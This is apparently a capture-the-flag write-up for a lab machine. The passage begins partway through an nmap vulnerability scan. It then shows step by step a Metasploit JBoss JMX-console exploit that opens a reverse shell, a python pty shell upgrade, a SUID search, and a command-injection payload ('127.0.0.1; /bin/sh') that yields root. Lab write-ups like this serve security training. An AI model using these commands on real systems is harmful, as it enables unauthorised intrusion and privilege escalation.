|     	CD6A79B3-8167-5CFD-9FCB-6986FDF0BE1A	7.5	https://vulners.com/githubexploit/CD6A79B3-8167-5CFD-9FCB-6986FDF0BE1A	*EXPLOIT*
|     	A0F268C8-7319-5637-82F7-8DAF72D14629	7.5	https://vulners.com/githubexploit/A0F268C8-7319-5637-82F7-8DAF72D14629	*EXPLOIT*
|     	857E0BF8-9A29-54C5-82EA-8D7C0798CAA6	7.5	https://vulners.com/githubexploit/857E0BF8-9A29-54C5-82EA-8D7C0798CAA6	*EXPLOIT*
|     	56EC26AF-7FB6-5CF0-B179-6151B1D53BA5	7.5	https://vulners.com/githubexploit/56EC26AF-7FB6-5CF0-B179-6151B1D53BA5	*EXPLOIT*
|     	45D138AD-BEC6-552A-91EA-8816914CA7F4	7.5	https://vulners.com/githubexploit/45D138AD-BEC6-552A-91EA-8816914CA7F4	*EXPLOIT*
|     	CVE-2025-49812	7.4	https://vulners.com/cve/CVE-2025-49812
|     	HTTPD:D66D5F45690EBE82B48CC81EF6388EE8	7.3	https://vulners.com/httpd/HTTPD:D66D5F45690EBE82B48CC81EF6388EE8
|     	CVE-2023-38709	7.3	https://vulners.com/cve/CVE-2023-38709
|     	CVE-2020-35452	7.3	https://vulners.com/cve/CVE-2020-35452
|     	CNVD-2024-36395	7.3	https://vulners.com/cnvd/CNVD-2024-36395
|     	PACKETSTORM:127546	6.8	https://vulners.com/packetstorm/PACKETSTORM:127546	*EXPLOIT*
|     	HTTPD:3EDB21E49474605400D2476536BB9C24	6.8	https://vulners.com/httpd/HTTPD:3EDB21E49474605400D2476536BB9C24
|     	CVE-2014-0226	6.8	https://vulners.com/cve/CVE-2014-0226
|     	1337DAY-ID-22451	6.8	https://vulners.com/zdt/1337DAY-ID-22451*EXPLOIT*
|     	CVE-2025-65082	6.5	https://vulners.com/cve/CVE-2025-65082
|     	CNVD-2025-30833	6.5	https://vulners.com/cnvd/CNVD-2025-30833
|     	CVE-2024-24795	6.3	https://vulners.com/cve/CVE-2024-24795
|     	CNVD-2024-36394	6.3	https://vulners.com/cnvd/CNVD-2024-36394
|     	HTTPD:E3E8BE7E36621C4506552BA051ECC3C8	6.1	https://vulners.com/httpd/HTTPD:E3E8BE7E36621C4506552BA051ECC3C8
|     	HTTPD:8DF9389A321028B4475CE2E9B5BFC7A6	6.1	https://vulners.com/httpd/HTTPD:8DF9389A321028B4475CE2E9B5BFC7A6
|     	HTTPD:5FF2D6B51D8115FFCB653949D8D36345	6.1	https://vulners.com/httpd/HTTPD:5FF2D6B51D8115FFCB653949D8D36345
|     	HTTPD:503FD99BD66D7A2A870F8608BC17CE57	6.1	https://vulners.com/httpd/HTTPD:503FD99BD66D7A2A870F8608BC17CE57
|     	CVE-2020-1927	6.1	https://vulners.com/cve/CVE-2020-1927
|     	CVE-2019-10098	6.1	https://vulners.com/cve/CVE-2019-10098
|     	CVE-2019-10092	6.1	https://vulners.com/cve/CVE-2019-10092
|     	CVE-2016-4975	6.1	https://vulners.com/cve/CVE-2016-4975
|     	CNVD-2020-21904	6.1	https://vulners.com/cnvd/CNVD-2020-21904
|     	CNVD-2018-15542	6.1	https://vulners.com/cnvd/CNVD-2018-15542
|     	CAB023BA-58A3-5C35-BF97-F9C43133DB5E	6.1	https://vulners.com/gitee/CAB023BA-58A3-5C35-BF97-F9C43133DB5E	*EXPLOIT*
|     	4013EC74-B3C1-5D95-938A-54197A58586D	6.1	https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D	*EXPLOIT*
|     	HTTPD:5C83890838E7C6903630B41EC3F2540D	5.9	https://vulners.com/httpd/HTTPD:5C83890838E7C6903630B41EC3F2540D
|     	CVE-2018-1302	5.9	https://vulners.com/cve/CVE-2018-1302
|     	CVE-2018-1301	5.9	https://vulners.com/cve/CVE-2018-1301
|     	CNVD-2018-06536	5.9	https://vulners.com/cnvd/CNVD-2018-06536
|     	CNVD-2018-06535	5.9	https://vulners.com/cnvd/CNVD-2018-06535
|     	1337DAY-ID-33577	5.8	https://vulners.com/zdt/1337DAY-ID-33577*EXPLOIT*
|     	HTTPD:B900BFA5C32A54AB9D565F59C8AC1D05	5.5	https://vulners.com/httpd/HTTPD:B900BFA5C32A54AB9D565F59C8AC1D05
|     	CVE-2020-13938	5.5	https://vulners.com/cve/CVE-2020-13938
|     	CNVD-2021-44765	5.5	https://vulners.com/cnvd/CNVD-2021-44765
|     	CNVD-2025-30835	5.4	https://vulners.com/cnvd/CNVD-2025-30835
|     	HTTPD:FCCF5DB14D66FA54B47C34D9680C0335	5.3	https://vulners.com/httpd/HTTPD:FCCF5DB14D66FA54B47C34D9680C0335
|     	HTTPD:EB26BC6B6E566C865F53A311FC1A6744	5.3	https://vulners.com/httpd/HTTPD:EB26BC6B6E566C865F53A311FC1A6744
|     	HTTPD:BAAB4065D254D64A717E8A5C847C7BCA	5.3	https://vulners.com/httpd/HTTPD:BAAB4065D254D64A717E8A5C847C7BCA
|     	HTTPD:8806CE4EFAA6A567C7FAD62778B6A46F	5.3	https://vulners.com/httpd/HTTPD:8806CE4EFAA6A567C7FAD62778B6A46F
|     	HTTPD:85F5649E5C2D697DCF21420D622C618E	5.3	https://vulners.com/httpd/HTTPD:85F5649E5C2D697DCF21420D622C618E
|     	HTTPD:5C8B0394DE17D1C29719B16CE00F475D	5.3	https://vulners.com/httpd/HTTPD:5C8B0394DE17D1C29719B16CE00F475D
|     	HTTPD:25716876F18D7575B7A8778A4476ED9E	5.3	https://vulners.com/httpd/HTTPD:25716876F18D7575B7A8778A4476ED9E
|     	CVE-2022-37436	5.3	https://vulners.com/cve/CVE-2022-37436
|     	CVE-2022-28614	5.3	https://vulners.com/cve/CVE-2022-28614
|     	CVE-2022-28330	5.3	https://vulners.com/cve/CVE-2022-28330
|     	CVE-2020-1934	5.3	https://vulners.com/cve/CVE-2020-1934
|     	CVE-2020-11985	5.3	https://vulners.com/cve/CVE-2020-11985
|     	CVE-2019-17567	5.3	https://vulners.com/cve/CVE-2019-17567
|     	CVE-2019-0220	5.3	https://vulners.com/cve/CVE-2019-0220
|     	CVE-2018-1283	5.3	https://vulners.com/cve/CVE-2018-1283
|     	CNVD-2023-30859	5.3	https://vulners.com/cnvd/CNVD-2023-30859
|     	CNVD-2022-53582	5.3	https://vulners.com/cnvd/CNVD-2022-53582
|     	CNVD-2022-51059	5.3	https://vulners.com/cnvd/CNVD-2022-51059
|     	CNVD-2021-44766	5.3	https://vulners.com/cnvd/CNVD-2021-44766
|     	CNVD-2020-46278	5.3	https://vulners.com/cnvd/CNVD-2020-46278
|     	CNVD-2020-29872	5.3	https://vulners.com/cnvd/CNVD-2020-29872
|     	CNVD-2019-08941	5.3	https://vulners.com/cnvd/CNVD-2019-08941
|     	SSV:96537	5.0	https://vulners.com/seebug/SSV:96537	*EXPLOIT*
|     	SSV:62058	5.0	https://vulners.com/seebug/SSV:62058	*EXPLOIT*
|     	SSV:61874	5.0	https://vulners.com/seebug/SSV:61874	*EXPLOIT*
|     	HTTPD:F8C8FF58A7154D4AEB884460782E6943	5.0	https://vulners.com/httpd/HTTPD:F8C8FF58A7154D4AEB884460782E6943
|     	HTTPD:EA40955F0C4A208F0F1841F397D60CF3	5.0	https://vulners.com/httpd/HTTPD:EA40955F0C4A208F0F1841F397D60CF3
|     	HTTPD:A158A6C24B676357DB136BEF8DE76E9B	5.0	https://vulners.com/httpd/HTTPD:A158A6C24B676357DB136BEF8DE76E9B
|     	HTTPD:867B7FEBC94AAFD9542C6BE363C3D8A3	5.0	https://vulners.com/httpd/HTTPD:867B7FEBC94AAFD9542C6BE363C3D8A3
|     	HTTPD:37A2DAF62C74FA5777EC2F97F085C496	5.0	https://vulners.com/httpd/HTTPD:37A2DAF62C74FA5777EC2F97F085C496
|     	HTTPD:3353898BFE39BBDF8391739FC2DDB5B1	5.0	https://vulners.com/httpd/HTTPD:3353898BFE39BBDF8391739FC2DDB5B1
|     	HTTPD:30E31E412AB4505FEE1161AB62A2E9AD	5.0	https://vulners.com/httpd/HTTPD:30E31E412AB4505FEE1161AB62A2E9AD
|     	EXPLOITPACK:DAED9B9E8D259B28BF72FC7FDC4755A7	5.0	https://vulners.com/exploitpack/EXPLOITPACK:DAED9B9E8D259B28BF72FC7FDC4755A7	*EXPLOIT*
|     	EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D	5.0	https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D	*EXPLOIT*
|     	CVE-2015-3183	5.0	https://vulners.com/cve/CVE-2015-3183
|     	CVE-2015-0228	5.0	https://vulners.com/cve/CVE-2015-0228
|     	CVE-2014-3581	5.0	https://vulners.com/cve/CVE-2014-3581
|     	CVE-2014-3523	5.0	https://vulners.com/cve/CVE-2014-3523
|     	CVE-2014-0231	5.0	https://vulners.com/cve/CVE-2014-0231
|     	CVE-2014-0098	5.0	https://vulners.com/cve/CVE-2014-0098
|     	CVE-2013-6438	5.0	https://vulners.com/cve/CVE-2013-6438
|     	CVE-2013-5704	5.0	https://vulners.com/cve/CVE-2013-5704
|     	CNVD-2015-01691	5.0	https://vulners.com/cnvd/CNVD-2015-01691
|     	1337DAY-ID-28573	5.0	https://vulners.com/zdt/1337DAY-ID-28573*EXPLOIT*
|     	1337DAY-ID-26574	5.0	https://vulners.com/zdt/1337DAY-ID-26574*EXPLOIT*
|     	SSV:87152	4.3	https://vulners.com/seebug/SSV:87152	*EXPLOIT*
|     	PACKETSTORM:127563	4.3	https://vulners.com/packetstorm/PACKETSTORM:127563	*EXPLOIT*
|     	HTTPD:C42F64A6857578ED72E18211FDE568E0	4.3	https://vulners.com/httpd/HTTPD:C42F64A6857578ED72E18211FDE568E0
|     	HTTPD:8EFEF9AED09575018B1942E8DC95B48B	4.3	https://vulners.com/httpd/HTTPD:8EFEF9AED09575018B1942E8DC95B48B
|     	HTTPD:883E996A34F70F5DF670D81697321AAB	4.3	https://vulners.com/httpd/HTTPD:883E996A34F70F5DF670D81697321AAB
|     	HTTPD:7BB4E1B5FF441B7BE1E27DCB50A9280A	4.3	https://vulners.com/httpd/HTTPD:7BB4E1B5FF441B7BE1E27DCB50A9280A
|     	HTTPD:45932C372ED0E0588A3AE5126126F55B	4.3	https://vulners.com/httpd/HTTPD:45932C372ED0E0588A3AE5126126F55B
|     	CVE-2016-8612	4.3	https://vulners.com/cve/CVE-2016-8612
|     	CVE-2015-3185	4.3	https://vulners.com/cve/CVE-2015-3185
|     	CVE-2014-8109	4.3	https://vulners.com/cve/CVE-2014-8109
|     	CVE-2014-0118	4.3	https://vulners.com/cve/CVE-2014-0118
|     	CVE-2014-0117	4.3	https://vulners.com/cve/CVE-2014-0117
|     	CVE-2013-4352	4.3	https://vulners.com/cve/CVE-2013-4352
|     	1337DAY-ID-33575	4.3	https://vulners.com/zdt/1337DAY-ID-33575*EXPLOIT*
|_    	PACKETSTORM:140265	0.0	https://vulners.com/packetstorm/PACKETSTORM:140265	*EXPLOIT*
| http-enum: 
|   /icons/: Potentially interesting folder w/ directory listing
|   /public/: Potentially interesting folder w/ directory listing
|_  /themes/: Potentially interesting folder w/ directory listing
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
1090/tcp open  java-rmi    Java RMI
1098/tcp open  java-rmi    Java RMI
1099/tcp open  java-object Java Object Serialization
|_rmi-vuln-classloader: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   NULL: 
|     java.rmi.MarshalledObject|
|     hash[
|     locBytest
|     objBytesq
|     xp?F
|     http://jacobtheboss.box:8083/q
|     org.jnp.server.NamingServer_Stub
|     java.rmi.server.RemoteStub
|     java.rmi.server.RemoteObject
|     xpw;
|     UnicastRef2
|_    jacobtheboss.box
3306/tcp open  mysql       MariaDB (unauthorized)
4444/tcp open  java-rmi    Java RMI
4445/tcp open  java-object Java Object Serialization
4446/tcp open  java-object Java Object Serialization
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
| http-internal-ip-disclosure: 
|_  Internal IP Leaked: 10
| http-vuln-cve2010-0738: 
|_  /jmx-console/: Authentication was not required
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-cookie-flags: 
|   /web-console/ServerInfo.jsp: 
|     JSESSIONID: 
|       httponly flag not set
|   /jmx-console/: 
|     JSESSIONID: 
|_      httponly flag not set
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /web-console/ServerInfo.jsp: JBoss Console
|   /web-console/Invoker: JBoss Console
|   /invoker/JMXInvokerServlet: JBoss Console
|_  /jmx-console/: JBoss Console
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.48.179.33
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.48.179.33:8080/jmx-console/HtmlAdaptor?action=displayMBeans
|     Form id: applyfilter
|_    Form action: HtmlAdaptor?action=displayMBeans
|_http-server-header: Apache-Coyote/1.1
8083/tcp open  http        JBoss service httpd
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
```

The scan returned multiple open services, but a few immediately stood out. SSH was running on port 22, and a web server was exposed on port 80 powered by Apache with PHP. Beyond that, several Java related services were listening on uncommon ports, which usually signals a larger application stack behind the scenes.

One particular finding caught my attention:
```
http-vuln-cve2010-0738: /jmx-console/: Authentication was not required
```
An exposed JMX console without authentication is never a good sign. That became my primary entry point.

## Exploitation

To validate and weaponize this finding, I moved into the Metasploit framework.
```
msfconsole -q
```
I searched for modules related to the identified vulnerability:
```
msf > search CVE 2010-0738
```
Several modules appeared, but the one that aligned best with the target environment was:
```
use exploit/multi/http/jboss_deploymentfilerepository
```
I configured the required parameters:
```
set LHOST tun0
set RHOST 10.48.179.33
```

With everything in place, I executed the exploit:
```
run
```
The target responded as expected and I landed a reverse shell.
<div align='center'>
  <img width="1073" height="279" alt="image" src="https://github.com/user-attachments/assets/e1bd0c1e-3bdb-4e85-bd49-67a8641e5d06" />
</div>

## Gaining Access

Once inside, I moved toward the user directory where the initial flag was likely stored:```

```
cd /home/jacob
```
The shell was not fully interactive, so I upgraded it to make navigation easier:
```
python -c 'import pty;pty.spawn("/bin/bash")'
```
This gave me a more stable shell to continue working.

## User Flag
I located the user flag within the directory.

<div align="center">
  <img width="467" height="272" alt="image" src="https://github.com/user-attachments/assets/a2605ddf-8447-41b6-a5bd-2a9976d3f9d0" />
</div>

```
f4d491f280de360cc49e26ca1587cbcc
```

## Privilege Escalation

With user access secured, the next objective was privilege escalation.

I started by enumerating SUID binaries across the system:
```
find / -perm /4000 -type f 2>/dev/null
```

<div align="center">
  <img width="638" height="522" alt="image" src="https://github.com/user-attachments/assets/584e805a-930f-4af2-82b5-1e62f2f8f7be" />
</div>

Among the results, one binary stood out:

```
/usr/bin/pingsys
```
After reviewing its behavior, I found that it could be abused to execute commands with elevated privileges.

Using that, I crafted the following payload:

```
/usr/bin/pingsys '127.0.0.1; /bin/sh'
```
This successfully spawned a root shell.

## Root Flag

With root access obtained, I navigated to retrieve the final flag.

<div align="center">
  <img width="856" height="885" alt="image" src="https://github.com/user-attachments/assets/3cb072db-1881-47d2-be64-cb7a2184f7d0" />
</div>

```
29a5641eaa0c01abe5749608c8232806
```

<div align="center">
  <img width="1173" height="492" alt="image" src="https://github.com/user-attachments/assets/921ca6a3-0c1a-4a1f-aaca-48ebed107e6e" />
</div>

Thanks for reading.

